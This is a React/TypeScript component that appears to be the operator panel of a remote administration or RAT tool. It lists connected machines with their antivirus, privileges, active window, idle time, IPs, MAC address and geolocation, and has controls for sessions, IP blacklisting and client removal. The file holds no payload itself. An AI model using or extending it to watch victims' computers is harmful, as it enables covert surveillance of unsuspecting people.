import { IProps, IState } from '../interfaces/components/Server.interface';
import { clientsLoad, sessionLoad } from '../redux/actions';
import { IClient } from '../interfaces/Client.interface';
import React, { Component, Fragment } from 'react';
import { connect } from 'react-redux';
import Sidebar from './Sidebar';
import Footer from './Footer';
import Select from './Select';
import {
	ServerTable,
	ServerTableHead,
	ServerTableBody,
	ServerTableRow,
	ServerTableHeader,
	ServerTableData,
	ServerTableImage,
	ServerTableBarBg,
	ServerTableBar,
	ServerBlock
} from '../design/components/Server.design';

class Server extends Component<IProps, IState> {
	tableBody: any = React.createRef();
	touchStartMenuTimestamp = 0;
	touchEndMenuTimestamp = 0;
	lastSelected: any = null;
	// CONSTANT : assumes these are
	// the same on the server side
	displayKeys = [
		'Row',
		'Country',
		'Connect IP',
		'Unique ID',
		'Username',
		'Hostname',
		'Privileges',
		'Antivirus',
		'Operating System',
		'CPU',
		'GPU',
		'RAM',
		'Active Window',
		'Idle Time',
		'Resource Usage'
	]
	displayValues = [
		'username',
		'hostname',
		'privileges',
		'antivirus',
		'operating_system',
		'cpu',
		'gpu',
		'ram'
	]
	hiddenKeys = [
		'Initial Connect',
		'Filepath',
		'Running',
		'Build Name',
		'Build Version',
		'OS Version',
		'System Locale',
		'System Uptime',
		'PC Manufacturer',
		'PC Model',
		'MAC Address',
		'External IP',
		'Local IP',
		'Timezone',
		'Country Code',
		'Region',
		'~City',
		'~Zip Code',
		'~Latitude',
		'~Longitude'
	]
	hiddenValues = [
		'initial_connect',
		'filepath',
		'running',
		'build_name',
		'build_version',
		'os_version',
		'system_locale',
		'system_uptime',
		'pc_manufacturer',
		'pc_model',
		'mac_address',
		'external_ip',
		'local_ip',
		'timezone',
		'country_code',
		'region',
		'city',
		'zip_code',
		'latitude',
		'longitude'
	]

	constructor(props: IProps) {
		super(props);

		this.state = {
			selectData: { show: false },
			clients: props.clients,
			session: props.session
		};
	}

	componentDidMount() {
		const { clientsLoad, sessionLoad } = this.props;

		window.addEventListener('click', () => {
			this.setState({ selectData: { show: false } });
			this.clearSelected();
		});

		window.eel.clients_eel()((clients: Map<string, IClient>) =>
			window.eel.session_eel()((session: Set<string>) => {
				clientsLoad(clients);
				sessionLoad(session);
			})
		);
	}

	sessionAdd = () => {
		const selected = this.allSelected('unique-id');
		const length = selected.length;

		if (length > 0) {
			window.eel.execute_eel({
				message: 'session',
				id: selected.join(','),
			})((response: string) => console.log(response));
			window.showAlert({
				message: `Client${this.plural(selected)} Added To Session`,
				type: 'SUCCESS',
			});
		} else this.selectMenuError();
	};

	sessionRemove = () => {
		const selected = this.allSelected('unique-id');
		const length = selected.length;

		if (length > 0) {
			window.eel.execute_eel({
				message: 'session',
				id: selected.join(','),
				remove: true,
			})((response: string) => console.log(response));
			window.showAlert({
				message: `Client${this.plural(selected)} Removed From Session`,
				type: 'SUCCESS',
			});
		} else this.selectMenuError();
	};

	blacklistAdd = () => {
		const selected = this.allSelected('connect-ip');
		const length = selected.length;

		if (length > 0) {
			window.eel.execute_eel({
				message: 'blacklist',
				add: selected.join(','),
			})((response: string) => console.log(response));
			window.showAlert({
				message: `Blacklist Address${this.plural(selected, 'es')} Added`,
				type: 'SUCCESS',
			});
		} else this.selectMenuError();
	};

	blacklistRemove = () => {
		const selected = this.allSelected('connect-ip');
		const length = selected.length;

		if (length > 0) {
			window.eel.execute_eel({
				message: 'blacklist',
				remove: selected.join(','),
			})((response: string) => console.log(response));
			window.showAlert({
				message: `Blacklist Address${this.plural(selected, 'es')} Removed`,
				type: 'SUCCESS',
			});
		} else this.selectMenuError();
	};

	clientRemove = () => {
		const selected = this.allSelected('unique-id');
		const length = selected.length;

		if (length > 0) {
			window.eel.execute_eel({
				message: 'delete',
				id: selected.join(','),
			})((response: string) => console.log(response));
			window.showAlert({
				message: `Client${this.plural(selected)} Removed`,
				type: 'SUCCESS',
			});
		} else this.selectMenuError();
	};

	clipboard = (data: string) => (event: any) => {
		if (event.altKey) {
			if (window.isSecureContext) {
				window.navigator.clipboard.writeText(data);
				window.showAlert({
					message: 'Field Copied To Clipboard',
					type: 'SUCCESS'
				});
			} else
				window.showAlert({
					message: 'Clipboard Failed',
					type: 'DANGER',
				});

			event.stopPropagation();
			event.preventDefault();
		}
	};

	selectMenuError = () => window.showAlert({
		message: 'Select Menu Error',
		type: 'DANGER',
	});

	plural = (array: string[], end = 's') =>
		array.length === 1 ? '' : end;

	errorFlag = (event: any) =>
		// CONSTANT : placeholder flag name
		event.currentTarget.src = './static/flags/placeholder.png';

	properties = (client: IClient) => {
		let result: string[] | string = [];

		for (let i = 0; i < this.hiddenValues.length; i++) {
			const value = (client as any)[this.hiddenValues[i]];
			const key = this.hiddenKeys[i];
			result.push(`${key}: ${value}`);
		}

		return this.propertiesResult(result.join('\n'));
	};

	propertiesResult = (result: string) => ({
		onContextMenu: this.clipboard(result),
		title: result
	});

	menu = (event: any) =>
		this.isSelected(event.currentTarget) &&
		this.setState({
			selectData: {
				show: true,
				// CONSTANT : when to swap menu horizontally (right to left)
				left:
					window.innerWidth - event.clientX < 165
						? event.clientX - 136
						: event.clientX,
				// CONSTANT : when to swap menu vertically (bottom to top)
				top:
					window.innerHeight - event.clientY < 165
						? event.clientY - 150
						: event.clientY,
				sessionAdd: this.sessionAdd,
				sessionRemove: this.sessionRemove,
				blacklistAdd: this.blacklistAdd,
				blacklistRemove: this.blacklistRemove,
				clientRemove: this.clientRemove
			},
		});

	touchStartMenu = (event: any) =>
		(this.touchStartMenuTimestamp = event.timeStamp);

	touchEndMenu = (event: any) => {
		this.touchEndMenuTimestamp = event.timeStamp;
		// CONSTANT : hold down touch time
		this.touchEndMenuTimestamp - this.touchStartMenuTimestamp > 300 &&
			this.menu(event);
	};

	select = (event: any) => {
		this.setState({ selectData: { show: false } });
		const current = event.currentTarget;

		if (event.ctrlKey) {
			if (this.isSelected(current)) {
				this.removeSelected(current);
				this.lastSelected = null;
			} else {
				this.addSelected(current);
				this.lastSelected = current;
			}
		} else if (event.shiftKey) {
			const rows = this.tableBody.current.rows;
			let currentPosition = 0;
			let latestPosition = 0;

			for (let i = 0; i < rows.length; i++)
				if (rows[i] === current) currentPosition = i;
				else if (rows[i] === this.lastSelected) latestPosition = i;

			this.rangeSelect(rows, currentPosition, latestPosition);
		} else this.singleSelect(current);

		event.stopPropagation();
	};

	singleSelect = (row: any) => {
		const rows = this.tableBody.current.rows;
		let currentSelected = false,
			otherSelected = false;

		for (let i = 0; i < rows.length; i++)
			if (rows[i] !== row) {
				if (this.isSelected(rows[i])) {
					if (!otherSelected) otherSelected = true;
					this.removeSelected(rows[i]);
				}
			} else if (this.isSelected(row)) currentSelected = true;

		if (currentSelected && !otherSelected) {
			this.removeSelected(row);
			this.lastSelected = null;
		} else {
			this.addSelected(row);
			this.lastSelected = row;
		}
	};

	rangeSelect = (rows: any, start: number, end: number) => {
		if (this.lastSelected !== rows[start]) {
			if (start > end) {
				let n = start;
				start = end;
				end = n;
			}

			for (let i = 0; i < rows.length; i++)
				if (i >= start && i <= end) {
					if (!this.isSelected(rows[i])) this.addSelected(rows[i]);
				} else if (this.isSelected(rows[i])) this.removeSelected(rows[i]);
		} else this.singleSelect(this.lastSelected);
	};

	allSelected = (dataAttribute: string) => {
		let result = [];

		if (this.tableBody.current !== null) {
			const rows = this.tableBody.current.rows;

			for (let i = 0; i < rows.length; i++)
				if (this.isSelected(rows[i]))
					result.push(rows[i].getAttribute(`data-${dataAttribute}`));
		}

		return result;
	};

	clearSelected = () => {
		if (this.tableBody.current !== null) {
			const rows = this.tableBody.current.rows;
			this.lastSelected = null;

			for (let i = 0; i < rows.length; i++)
				if (this.isSelected(rows[i])) this.removeSelected(rows[i]);
		}
	};

	addSelected = (row: any) => {
		row.setAttribute('data-selected', '');
		row.style.backgroundColor = 'rgb(0, 40, 80)';
	};

	removeSelected = (row: any) => {
		row.removeAttribute('data-selected');
		row.removeAttribute('style');
	};

	isSelected = (row: any) => row.hasAttribute('data-selected');

	render() {
		const { clients, session } = this.props;
		const { selectData } = this.state;

		return (
			<Fragment>
				{clients.size > 0 ? (
					<ServerTable>
						<ServerTableHead>
							<ServerTableRow>
								{this.displayKeys.map((category: string, index: number) => (
									<ServerTableHeader key={index} title={category}>
										{category}
									</ServerTableHeader>
								))}
							</ServerTableRow>
						</ServerTableHead>
						<ServerTableBody ref={this.tableBody}>
							{Array.from(clients.entries()).map(([unique_id, client]: [string, IClient], row: number) => (
								<ServerTableRow
									key={row}
									data-unique-id={unique_id}
									data-connect-ip={client.connect_ip}
									onClick={this.select}
									onContextMenu={this.menu}
									onTouchStart={this.touchStartMenu}
									onTouchEnd={this.touchEndMenu}
									activeSession={
										session.has(unique_id)
											? 'rgb(0, 255, 255)'
											: 'rgb(255, 255, 255)'
									}
								>
									<ServerTableData
										data-label={this.displayKeys[0]}
										{...this.properties(client)}
									>
										{row + 1}
									</ServerTableData>

									<ServerTableData
										data-label={this.displayKeys[1]}
										title={client.country}
										onContextMenu={this.clipboard(client.country)}
									>
										<Fragment>
											<ServerTableImage
												src={`./static/flags/${client.country_code}.png`}
												onError={this.errorFlag}
											/>
											{client.country}
										</Fragment>
									</ServerTableData>

									<ServerTableData
										data-label={this.displayKeys[2]}
										title={client.connect_ip}
										onContextMenu={this.clipboard(client.connect_ip)}
									>
										{client.connect_ip}
									</ServerTableData>

									<ServerTableData
										data-label={this.displayKeys[3]}
										title={unique_id}
										onContextMenu={this.clipboard(unique_id)}
									>
										{unique_id}
									</ServerTableData>

									{this.displayValues.map(
										(displayValue: string, column: number) => (
											<ServerTableData
												key={column}
												data-label={
													// CONSTANT : start index
													this.displayKeys[4 + column]
												}
												title={(client as any)[displayValue]}
												onContextMenu={this.clipboard(
													(client as any)[displayValue]
												)}
											>
												{(client as any)[displayValue]}
											</ServerTableData>
										)
									)}

									<ServerTableData
										data-label={
											this.displayKeys[this.displayKeys.length - 3]
										}
										{...client.active_window && (
											{
												title: client.active_window,
												onContextMenu: this.clipboard(
													client.active_window
												)
											}
										)}
									>
										{client.active_window ? client.active_window : '...'}
									</ServerTableData>

									<ServerTableData
										data-label={
											this.displayKeys[this.displayKeys.length - 2]
										}
										{...client.idle_time && (
											{
												title: client.idle_time,
												onContextMenu: this.clipboard(
													client.idle_time
												)
											}
										)}
									>
										{client.idle_time ? client.idle_time : '...'}
									</ServerTableData>

									<ServerTableData
										data-label={
											this.displayKeys[this.displayKeys.length - 1]
										}
										{...client.resource_usage && (
											{
												title: client.resource_usage,
												onContextMenu: this.clipboard(
													client.resource_usage
												)
											}
										)}
									>
										{client.resource_usage ? (
											// CONSTANT : cpu/ram
											client.resource_usage
												.split('/')
												.map((bar: string) => (
													<ServerTableBarBg>
														<ServerTableBar width={bar} />
													</ServerTableBarBg>
												))
										) : '...'}
									</ServerTableData>
								</ServerTableRow>
							))}
						</ServerTableBody>
					</ServerTable>
				) : (
						<ServerBlock>No Clients Connected</ServerBlock>
					)}
				<Sidebar />
				<Footer />
				<Select
					show={selectData.show}
					top={selectData.top}
					left={selectData.left}
					sessionAdd={selectData.sessionAdd}
					sessionRemove={selectData.sessionRemove}
					blacklistAdd={selectData.blacklistAdd}
					blacklistRemove={selectData.blacklistRemove}
					clientRemove={selectData.clientRemove}
				/>
			</Fragment>
		);
	}
}

const mapStateToProps = (state: IProps) => {
	return {
		session: state.session,
		clients: state.clients
	};
};

const mapDispatchToProps = (dispatch: any) => {
	return {
		clientsLoad: (clients: Map<string, IClient>) => dispatch(clientsLoad(clients)),
		sessionLoad: (session: Set<string>) => dispatch(sessionLoad(session))
	};
};

export default connect(mapStateToProps, mapDispatchToProps)(Server);
